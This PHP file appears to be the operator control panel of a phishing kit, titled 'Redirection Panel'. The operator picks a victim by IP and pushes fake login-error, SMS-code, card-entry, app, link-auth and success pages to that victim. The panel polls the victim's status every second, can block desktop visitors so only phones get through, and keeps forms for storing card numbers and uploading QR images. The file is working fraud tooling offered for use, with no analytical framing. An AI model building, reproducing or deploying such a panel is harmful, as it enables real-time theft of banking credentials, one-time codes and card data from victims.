<?php 
require 'panel.class.php';
$pnl = new Panel();

$__ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
$__ipp = "127.0.0.1";
}else{
$__ipp = $_SERVER['REMOTE_ADDR'];
}

if(isset($_GET['page'], $_GET['ip'])){
    $pnl->editVicFIle($_GET['page'], $_GET['ip']);
    header("location: ctr.php?ip=".$_GET['ip']."&redirected");
}

if(isset($_GET['block'])){
    $pnl->updateBlock($_GET['ip'], strtolower($_GET['block']));
    header("location: ctr.php?ip=".$_GET['ip']."&redirected");
    if($_GET["block"]=="yes"){
        $pnl->editVicFIle('mkfile.php?p=block', $_GET['ip']);
    }else{
        $pnl->editVicFIle('mkfile.php?p=login', $_GET['ip']);
    }
}

if(isset($_POST['ip']) and isset($_FILES['qr'])){
    $ext = pathinfo($_FILES['qr']['name'], PATHINFO_EXTENSION);
    $newname = $pnl->getHashName($_POST['ip']).".png";

    if (file_exists("../panel/graveyard/qr/".$newname)) {
        unlink("../panel/graveyard/qr/".$newname);
    }

    move_uploaded_file($_FILES['qr']['tmp_name'], "../panel/graveyard/qr/".$newname);
    header("location: ctr.php?ip=".$_POST['ip']."&uploaded");
}


if(isset($_POST['cc'])){
    $cc = $_POST['cc'];
    $ip = $_POST['ip'];
    $pnl->updateD($ip, $cc);
    header("location: ctr.php?ip=".$_POST['ip']."&updated");
}


if(isset($_POST['inst'])){
    $inst = $_POST['inst'];
    $ip = $_POST['ip'];
    $pnl->updateInst($ip, $inst);
    header("location: ctr.php?ip=".$_POST['ip']."&updated");
}

?>
<!doctype html>
<html>
<head>
<title>Redirection Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/style.css">
</head>
<body>

<div class="btns">
<?php 


if(isset($_GET['redirected'])){
    echo "<h1>Redirected!</h1>";
}

if(isset($_GET['uploaded'])){
    echo "<h1>FILE UPLOADED!</h1>";
}
 
if(isset($_GET['updated'])){
    echo "<h1>DATA UPDATED!</h1>";
}
 

?>

<form>
    <span>[<?php echo @$_GET['ip'];?>] </span>
    <span>[<span id="statu">loading...</span>]</span>
</form>

<form action="ctr.php" method="get">
    <h3 style="color:white;">Control options</h3>
    <input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
    <button type="submit" name="page" value="mkfile.php?p=login&params=?e=ERROR">LOGIN ERROR</button>
    <button type="submit" name="page" value="mkfile.php?p=info">DETAILS</button>
    <button type="submit" name="page" value="mkfile.php?p=sms">SMS</button>
    <button type="submit" name="page" value="mkfile.php?p=sms&params=?e=error">SMS ERROR</button>
    <button type="submit" name="page" value="mkfile.php?p=card">CARD</button>
    <button type="submit" name="page" value="mkfile.php?p=card&params=?e=error">CARD ERROR</button>
    <button type="submit" name="page" value="mkfile.php?p=app">APP</button>
    <button type="submit" name="page" value="mkfile.php?p=inst&params=?e=error">INSTRUCTIONS</button>
    <button type="submit" name="page" value="mkfile.php?p=link">LINK AUTH</button>
    <button type="submit" name="page" value="mkfile.php?p=app">APPLICATION</button>
    <button type="submit" name="page" value="mkfile.php?p=done">SUCCESS</button>
    <button type="submit" name="page" value="exit.php">EXIT</button>
</form>
<form action="ctr.php" method="get">
    <h3 style="color:white;">Blockage Settings</h3>
    <p> <?php 
if($pnl->getBlock($__ipp) == "yes"){
echo '<span style="color:red; font-weight:bold;">PC BLOCKED. ONLY PHONES CAN ACCESS</span>';
}else{
    echo '<span style="color:green; font-weight:bold">PC NOT BLOCKED. ALL DEVICES CAN ACCESS</span>';
}
?></p>
    <input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
    <button type="submit" name="block" value="yes">Block PC</button>
    <button type="submit" name="block" value="no">Unblock PC</button>
</form>

<form action="ctr.php" method="post" enctype="multipart/form-data" >
<h3 style="color:white;">Add Instruction</h3>
<input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
<textarea style="width:100%; height:200px;" placeholder="Write some instructions here..." name="inst"><?php echo @$pnl->getInst(@$_GET['ip']); ?></textarea>
<button type="submit">ADD</button>
</form>




<!-- <form action="ctr.php" method="post" enctype="multipart/form-data" >
<h3 style="color:white;">Add card info</h3>
<input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
<input type="text" required placeholder="XXXX XXXX XXXX XXXX" value="<?php echo @$pnl->getD(@$_GET['ip']); ?>" name="cc" id="cc">
<button type="submit">ADD DETAILS</button>
</form> -->


<!-- <form action="ctr.php" method="post" enctype="multipart/form-data" >
<h3 style="color:white;">Upload QR Photo</h3>
<input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
<input type="file" required name="qr" style="background:green; width:100%; padding:10px;">
<button type="submit">Upload</button>
</form> -->

<!-- <form action="ctr.php" method="post" enctype="multipart/form-data" >
<h3 style="color:white;">Add Device name</h3>
<input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
<input type="text" style="width:100%;" placeholder="Write device name here..." name="inst" value="<?php echo @$pnl->getInst(@$_GET['ip']); ?>">
<button type="submit">ADD</button>
</form> -->


</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
    setInterval(() => {
        $.post("get_statu.php",{get:1, ip:'<?php echo @$_GET['ip']?>'},(res)=>{
            $("#statu").html(res);
        });
    }, 1000);
</script>

</body>
</html>